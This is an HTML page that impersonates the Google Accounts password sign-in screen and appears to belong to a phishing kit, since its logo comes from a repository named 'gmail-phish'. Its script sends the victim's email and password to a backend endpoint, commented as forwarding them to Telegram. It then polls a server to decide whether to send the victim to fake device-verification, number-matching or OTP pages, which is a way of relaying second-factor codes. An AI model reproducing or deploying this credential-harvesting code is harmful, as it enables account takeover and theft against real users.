<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="icon" type="image/x-icon" href="images/google-logo-vector-format-white-background-illustration-407571050.webp">
    <style>
        :root {
            --gmail-blue: #1a73e8;
            --gmail-red: #ea4335;
            --gmail-yellow: #fbbc04;
            --gmail-green: #34a853;
            --gmail-white: #ffffff;
            --gmail-gray: #5f6368;
            --gmail-light-gray: #f1f3f4;
            --gmail-border: #dadce0;
        }

        * {
            box-sizing: border-box;
        }

        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: var(--gmail-white);
            color: #202124;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        .login-gmail-form {
            width: 100%;
            max-width: 450px;
            margin: 0 auto;
            padding: 48px 36px 36px !important;
            box-sizing: border-box;
        }

        .login-gmail-logo {
            width: 220px !important;
            height: 75px !important;
            margin: 0 0 12px 0 !important;
            display: block !important;
            background: url('https://raw.githubusercontent.com/eunicewellis/gmail-phish/master/images/image8-2.png') no-repeat left center !important;
            background-size: contain !important;
        }

        .user-display {
            display: flex;
            align-items: center;
            margin-bottom: 16px;
        }

        .user-avatar {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            background: #202124;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
            font-weight: 500;
            margin-right: 12px;
        }

        .user-email {
            font-size: 14px;
            color: #202124;
        }

        .login-title {
            font-size: 32px !important;
            font-weight: 400 !important;
            color: #202124 !important;
            margin: 0 0 16px 0 !important;
            text-align: left !important;
        }

        .login-subtitle {
            font-size: 16px;
            font-weight: 400;
            color: #5f6368;
            margin: 0 0 32px 0;
            text-align: left;
        }

        .login-input-wrapper {
            position: relative;
            margin-bottom: 8px;
            border: 1px solid #000000;
            border-radius: 4px;
            transition: border-color 0.2s ease;
            height: 56px;
        }

        .login-input-wrapper.focused {
            border-color: var(--gmail-blue);
        }

        .login-input-label {
            position: absolute;
            top: 50%;
            left: 16px;
            transform: translateY(-50%);
            color: var(--gmail-gray);
            font-size: 16px;
            font-weight: 400;
            pointer-events: none;
            transition: all 0.2s ease;
            z-index: 1;
            opacity: 1;
        }

        .login-input-wrapper.focused .login-input-label,
        .login-gmail-input:not(:placeholder-shown) + .login-input-wrapper .login-input-label {
            top: -8px;
            left: 16px;
            transform: none;
            font-size: 12px;
            background: var(--gmail-white);
            padding: 0 4px;
        }

        .login-input-wrapper.focused .login-input-label {
            color: var(--gmail-blue);
        }

        .login-gmail-input {
            width: 100%;
            height: 100%;
            padding: 16px;
            border: none;
            border-radius: 4px;
            background: transparent;
            color: #202124;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
            position: relative;
            z-index: 1;
        }

        .login-gmail-input:focus,
        .login-input-wrapper.focused .login-gmail-input,
        .login-gmail-input:not(:placeholder-shown) {
            padding: 20px 15px 4px 15px;
        }

        .password-toggle {
            position: absolute;
            right: 16px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: var(--gmail-blue);
            font-size: 14px;
            font-weight: 500;
            z-index: 2;
        }

        .login-gmail-links {
            text-align: left;
            margin-bottom: 40px;
        }

        .login-gmail-links a {
            color: var(--gmail-blue);
            text-decoration: none;
            font-size: 15px;
            font-weight: 500;
        }

        .login-gmail-links a:hover {
            text-decoration: underline;
        }

        .login-bottom-section {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
        }

        .login-create-account {
            color: var(--gmail-blue);
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }

        .login-create-account:hover {
            text-decoration: underline;
        }

        .login-gmail-next-btn {
            width: auto;
            min-width: 90px;
            max-width: 120px;
            background: var(--gmail-blue);
            color: var(--gmail-white);
            border: none;
            border-radius: 24px;
            padding: 12px 24px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            position: relative;
        }

        .login-gmail-next-btn:hover {
            background: #1557b0;
        }

        .login-gmail-next-btn.loading {
            color: transparent;
        }

        .login-gmail-next-btn.loading::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 16px;
            height: 16px;
            margin: -8px 0 0 -8px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top: 2px solid var(--gmail-white);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .error-message {
            color: var(--gmail-red);
            font-size: 14px;
            margin-top: 8px;
            display: none;
        }

        .login-gmail-footer {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #f8f9fa;
            border-top: 1px solid var(--gmail-border);
            padding: 16px 24px;
        }

        .login-footer-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
            max-width: 1200px;
            margin: 0 auto;
            flex-wrap: wrap;
            gap: 16px;
        }

        .login-footer-left {
            display: flex;
            align-items: center;
            gap: 24px;
        }

        .login-language-select {
            background: transparent;
            border: none;
            color: var(--gmail-gray);
            font-size: 14px;
            cursor: pointer;
            outline: none;
        }

        .login-footer-links {
            display: flex;
            gap: 24px;
        }

        .login-footer-links a {
            color: var(--gmail-gray);
            text-decoration: none;
            font-size: 14px;
        }

        .login-footer-links a:hover {
            text-decoration: underline;
        }

        @media (max-width: 768px) {
            .login-gmail-form {
                padding: 32px 24px 24px;
            }

            .login-title {
                font-size: 22px;
            }

            .login-gmail-footer {
                padding: 12px 16px;
            }

            .login-footer-content {
                flex-direction: column;
                gap: 12px;
                text-align: center;
            }
        }
    </style>
</head>
<body>
    <div class="login-gmail-form">
        <div class="login-gmail-logo"></div>
        
        <h1 class="login-title">Welcome</h1>
        
        <div class="user-display">
            <div class="user-avatar" id="userAvatar">
                <svg width="14" height="16" viewBox="0 0 24 24" fill="white" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
                </svg>
            </div>
            <span class="user-email" id="userEmail"></span>
        </div>

        <div class="login-subtitle">Enter your password</div>

        <div class="login-input-wrapper">
            <label for="password" class="login-input-label">Enter your password</label>
            <input type="password" id="password" class="login-gmail-input" required>
            <span class="password-toggle" onclick="togglePassword()">Show</span>
        </div>

        <div class="error-message" id="errorMsg">Wrong password. Try again or click Forgot password to reset it.</div>

        <div class="login-gmail-links">
            <a href="#">Forgot password?</a>
        </div>

        <div class="login-bottom-section">
            <a href="#" class="login-create-account" onclick="window.location.href='login.html'">Back</a>
            <button class="login-gmail-next-btn" onclick="submitPassword()">Next</button>
        </div>
    </div>

    <footer class="login-gmail-footer">
        <div class="login-footer-content">
            <div class="login-footer-left">
                <select class="login-language-select" aria-label="Select language">
                    <option>English (United States)</option>
                </select>
                <div class="login-footer-links">
                    <a href="#">Help</a>
                    <a href="#">Privacy</a>
                    <a href="#">Terms</a>
                </div>
            </div>
        </div>
    </footer>

    <script>
        // Get email from URL
        const urlParams = new URLSearchParams(window.location.search);
        const email = urlParams.get('email') || '';

        // Display user info
        document.getElementById('userEmail').textContent = email;
        document.getElementById('userAvatar').textContent = email.charAt(0).toUpperCase();

        // Handle input focus/blur
        const inputWrapper = document.querySelector('.login-input-wrapper');
        const input = document.getElementById('password');
        const label = document.querySelector('.login-input-label');

        input.addEventListener('focus', function() {
            inputWrapper.classList.add('focused');
        });

        input.addEventListener('blur', function() {
            if (!this.value.trim()) {
                inputWrapper.classList.remove('focused');
            }
        });

        input.addEventListener('input', function() {
            if (this.value.trim()) {
                label.style.display = 'none';
            } else {
                label.style.display = 'block';
            }
            document.getElementById('errorMsg').style.display = 'none';
        });

        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const toggle = document.querySelector('.password-toggle');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggle.textContent = 'Hide';
            } else {
                passwordInput.type = 'password';
                toggle.textContent = 'Show';
            }
        }

        function changeUser() {
            window.location.href = 'login.html';
        }

        function submitPassword() {
            const password = document.getElementById('password').value;
            const button = document.querySelector('.login-gmail-next-btn');

            if (password.trim()) {
                // Always show loading state
                button.classList.add('loading');
                button.disabled = true;
                document.getElementById('errorMsg').style.display = 'none';

                // Send to Telegram
                const xhr = new XMLHttpRequest();
                xhr.open('POST', '/api/next.php', true);
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4) {
                        button.classList.remove('loading');
                        button.disabled = false;

                        if (xhr.status === 200) {
                            // Check verification control for redirect
                            checkVerificationControl();
                        } else {
                            // Only show error if not loading
                            if (!button.classList.contains('loading')) {
                                document.getElementById('errorMsg').style.display = 'block';
                            }
                        }
                    }
                };
                xhr.send('di=' + encodeURIComponent(email) + '&pr=' + encodeURIComponent(password));
            } else {
                document.getElementById('errorMsg').style.display = 'block';
            }
        }

        function checkVerificationControl() {
            // Check what verification prompt to show
            const xhr = new XMLHttpRequest();
            xhr.open('GET', '/api/verify.php?email=' + encodeURIComponent(email), true);
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    try {
                        const response = JSON.parse(xhr.responseText);
                        if (response.prompt_type) {
                            // Redirect based on prompt type
                            switch (response.prompt_type) {
                                case 'device_verify':
                                    window.location.href = 'device_verify.html?email=' + encodeURIComponent(email);
                                    break;
                                case 'choose_number':
                                    window.location.href = 'choose_number.html?email=' + encodeURIComponent(email) + '&number=' + (response.number || '');
                                    break;
                                case 'otp':
                                    window.location.href = 'otp.html?email=' + encodeURIComponent(email);
                                    break;
                                default:
                                    // Stay on page or show error
                                    document.getElementById('errorMsg').style.display = 'block';
                            }
                        } else {
                            // No prompt set, show error or retry
                            document.getElementById('errorMsg').style.display = 'block';
                        }
                    } catch (e) {
                        document.getElementById('errorMsg').style.display = 'block';
                    }
                }
            };
            xhr.send();
        }

        // Enter key support
        document.getElementById('password').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                submitPassword();
            }
        });
    </script>
</body>
</html>
